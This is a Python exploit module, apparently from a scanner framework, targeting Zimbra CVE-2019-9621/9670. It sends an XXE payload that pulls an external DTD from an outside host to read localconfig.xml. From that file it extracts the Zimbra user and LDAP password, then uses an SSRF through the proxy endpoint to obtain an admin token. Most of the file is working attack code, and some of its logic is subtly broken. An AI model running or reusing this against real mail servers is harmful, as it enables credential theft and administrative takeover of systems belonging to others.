#!/usr/bin/env python3

import re
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2019_9621_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-9621 任意代码执行漏洞',
            'description': 'CVE-2019-9621 任意代码执行漏洞,通过上传dtd文件,来获取shell执行任意命令,需要公网的dtd,暂时用的k8gege的公网dtd文件,影响范围为: Zimbra Collaboration Suite before 8.6 patch 13, 8.7.x before 8.7.11 patch 10, and 8.8.x before 8.8.10 patch 7 or 8.8.x before 8.8.11 patch 3',
            'date': '2019-03-06',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers={
            "User-Agent": get_useragent(),
            "Content-Type": "application/xml"
        }
        self.username = ''
        self.password = ''
        self.low_priv_token = ''
        self.auth_body = ''
        self.admin_token = ''

    async def get_low_token(self):
        
        """
        获取低权限的token

        :param:

        :return:
        """
        
        self.auth_body = """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
           <soap:Header>
               <context xmlns="urn:zimbra">
                   <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
               </context>
           </soap:Header>
           <soap:Body>
             <AuthRequest xmlns="urn:zimbraAccount">
                <account by="adminName">{username}</account>
                <password>{password}</password>
             </AuthRequest>
           </soap:Body>
        </soap:Envelope>
        """.format(username = self.username, password = self.password)
        print("[*] Get Low Privilege Auth Token")
        req = await request.post(self.url + "/service/soap", headers = self.headers, data = self.auth_body)
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        self.low_priv_token = pattern_auth_token.findall(await req.text())[0]

    async def get_admin_token(self):
        
        """
        获取高权限的token

        :param:

        :return:
        """
        
        self.headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN=" + self.low_priv_token + ";"
        self.headers["Host"]="foo:7071"
        print("[*] Get Admin  Auth Token By SSRF")
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        req = await request.post(self.url + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", headers = self.headers,  data = self.auth_body)
        self.admin_token =pattern_auth_token.findall(await req.text())[0]

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            dtd_url = "https://k8gege.github.io/zimbra.dtd"
            """
            <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % end "]]>">
            <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
            """
            xxe_data = r"""<!DOCTYPE Autodiscover [
                    <!ENTITY % dtd SYSTEM "{dtd}">
                    %dtd;
                    %all;
                    ]>
            <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                <Request>
                    <EMailAddress>aaaaa</EMailAddress>
                    <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
                </Request>
            </Autodiscover>""".format(dtd = dtd_url)

            req = await request.post(self.url + "/Autodiscover/Autodiscover.xml",  headers = self.headers, data= xxe_data)
            if 'Error 503 Requested response schema not available' in await req.text():
                pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
                pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
                self.username = pattern_name.findall(await req.text())[0][2]
                self.password = pattern_password.findall(await req.text())[0][2]
                await self.get_low_token()
                await self.get_admin_token()
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2019_9670 = CVE_2019_9621_BaseVerify('https://127.0.0.1')
    CVE_2019_9670.check()